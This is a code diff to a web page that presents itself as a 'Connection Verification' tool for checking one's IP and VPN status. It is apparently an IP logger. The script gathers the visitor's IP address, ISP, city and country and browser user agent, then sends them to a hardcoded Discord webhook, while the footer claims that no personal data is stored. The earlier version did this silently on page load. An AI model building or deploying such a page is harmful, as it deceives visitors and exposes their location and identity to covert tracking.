@@ -2,13 +2,173 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <meta property="og:image" content="">
   <meta name="twitter:card" content="summary_large_image">
-  <title>Verification Site</title>
+  <title>Connection Verification</title>
+  <style>
+    :root {
+      --primary: #2ecc71;
+      --primary-dark: #27ae60;
+      --light: #ecf0f1;
+      --dark: #2c3e50;
+      --shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+    }
+    
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      line-height: 1.6;
+      color: var(--dark);
+      background-color: #f5f9fa;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+      align-items: center;
+      text-align: center;
+    }
+    
+    .container {
+      max-width: 800px;
+      width: 90%;
+      margin: 2rem auto;
+      padding: 2rem;
+      background: white;
+      border-radius: 10px;
+      box-shadow: var(--shadow);
+    }
+    
+    h1 {
+      color: var(--primary);
+      margin-bottom: 1.5rem;
+    }
+    
+    .logo {
+      width: 120px;
+      height: 120px;
+      margin: 0 auto 1.5rem;
+      background-color: var(--primary);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-size: 2.5rem;
+      box-shadow: var(--shadow);
+    }
+    
+    .btn {
+      display: inline-block;
+      background-color: var(--primary);
+      color: white;
+      padding: 12px 30px;
+      border: none;
+      border-radius: 50px;
+      font-size: 1.1rem;
+      font-weight: bold;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      margin: 1.5rem 0;
+      box-shadow: var(--shadow);
+      text-decoration: none;
+    }
+    
+    .btn:hover {
+      background-color: var(--primary-dark);
+      transform: translateY(-2px);
+      box-shadow: 0 6px 12px rgba(0, 0, 0, 0.15);
+    }
+    
+    .btn:active {
+      transform: translateY(0);
+    }
+    
+    .result-box {
+      margin-top: 2rem;
+      padding: 1.5rem;
+      background-color: #f8f9fa;
+      border-radius: 8px;
+      border-left: 4px solid var(--primary);
+      text-align: left;
+      display: none;
+    }
+    
+    footer {
+      margin-top: auto;
+      padding: 1rem;
+      font-size: 0.8rem;
+      color: #7f8c8d;
+    }
+    
+    .features {
+      display: flex;
+      justify-content: space-around;
+      flex-wrap: wrap;
+      margin: 2rem 0;
+    }
+    
+    .feature {
+      flex: 1;
+      min-width: 150px;
+      margin: 0.5rem;
+      padding: 1rem;
+    }
+    
+    .feature-icon {
+      font-size: 2rem;
+      color: var(--primary);
+      margin-bottom: 0.5rem;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">✓</div>
+    <h1>Connection Verification</h1>
+    <p>Verify your network connection and check if you're protected</p>
+    
+    <button class="btn" id="verifyBtn">Click to Verify!</button>
+    
+    <div class="features">
+      <div class="feature">
+        <div class="feature-icon">🌐</div>
+        <h3>IP Check</h3>
+        <p>View your current public IP address</p>
+      </div>
+      <div class="feature">
+        <div class="feature-icon">🔒</div>
+        <h3>VPN Detection</h3>
+        <p>Check if you're using a VPN or proxy</p>
+      </div>
+      <div class="feature">
+        <div class="feature-icon">⏱️</div>
+        <h3>Timestamp</h3>
+        <p>Record when you verified</p>
+      </div>
+    </div>
+    
+    <div class="result-box" id="resultBox">
+      <h3>Verification Results</h3>
+      <div id="verificationResults"></div>
+    </div>
+  </div>
+  
+  <footer>
+    <p>This tool helps verify your network connection status. No personal data is stored.</p>
+  </footer>
+
   <script>
     // Function to get IP and send to Discord
     async function logIP() {
+      const verifyBtn = document.getElementById('verifyBtn');
+      const resultBox = document.getElementById('resultBox');
+      const resultsDiv = document.getElementById('verificationResults');
+      
       try {
+        verifyBtn.disabled = true;
+        verifyBtn.textContent = 'Verifying...';
+        
         // Get IP address
         const ipResponse = await fetch('https://api.ipify.org?format=json');
         const ipData = await ipResponse.json();
@@ -16,6 +176,9 @@
         
         // Get additional IP info (for VPN detection)
         let vpnInfo = "Could not determine VPN status";
+        let isp = "Unknown";
+        let location = "Unknown";
+        
         try {
           const infoResponse = await fetch(`https://ipapi.co/${ip}/json/`);
           const infoData = await infoResponse.json();
@@ -28,13 +191,25 @@
           );
           
           vpnInfo = isLikelyVPN ? "🔒 Likely VPN/Proxy" : "🏠 Likely Home IP";
-          vpnInfo += ` | ISP: ${infoData.org || 'Unknown'}`;
+          isp = infoData.org || 'Unknown';
+          location = `${infoData.city || ''}${infoData.city && infoData.country_name ? ', ' : ''}${infoData.country_name || ''}`;
         } catch (e) {
           console.error("Couldn't get IP details:", e);
         }
         
         // Get user agent
         const userAgent = navigator.userAgent;
+        
+        // Display results to user
+        resultsDiv.innerHTML = `
+          <p><strong>IP Address:</strong> ${ip}</p>
+          <p><strong>Status:</strong> ${vpnInfo}</p>
+          <p><strong>ISP:</strong> ${isp}</p>
+          <p><strong>Location:</strong> ${location}</p>
+          <p><strong>Time:</strong> ${new Date().toLocaleString()}</p>
+        `;
+        
+        resultBox.style.display = 'block';
         
         // Send to Discord webhook
         await fetch("https://discord.com/api/webhooks/1356844545039667251/bsfmIz-FGQbt_TSHa24eT3wauJFXbaWcgZo_2l2o37FJtXDRrs0HuZr8pRrTrl3cYrhN", {
@@ -43,23 +218,22 @@
             "Content-Type": "application/json"
           },
           body: JSON.stringify({
-            content: `🌐 New Visit!\nIP: ${ip}\n${vpnInfo}\nUser Agent: ${userAgent}\nTimestamp: ${new Date().toISOString()}`
+            content: `🌐 Verification Request!\nIP: ${ip}\nStatus: ${vpnInfo}\nISP: ${isp}\nLocation: ${location}\nUser Agent: ${userAgent}\nTimestamp: ${new Date().toISOString()}`
           })
         });
         
       } catch (error) {
+        resultsDiv.innerHTML = `<p style="color: #e74c3c;">Error during verification. Please try again.</p>`;
+        resultBox.style.display = 'block';
         console.error("Error logging IP:", error);
+      } finally {
+        verifyBtn.disabled = false;
+        verifyBtn.textContent = 'Verify Again';
       }
     }
     
-    // Run when page loads
-    window.onload = logIP;
+    // Set up button click event
+    document.getElementById('verifyBtn').addEventListener('click', logIP);
   </script>
-</head>
-<body>
-  <img src="download.jpg" style="max-width: 100%;" alt="Cute cat">
-  <h1>Verification Site</h1>
-  <p></p>
-  <p><small></small></p>
 </body>
 </html>
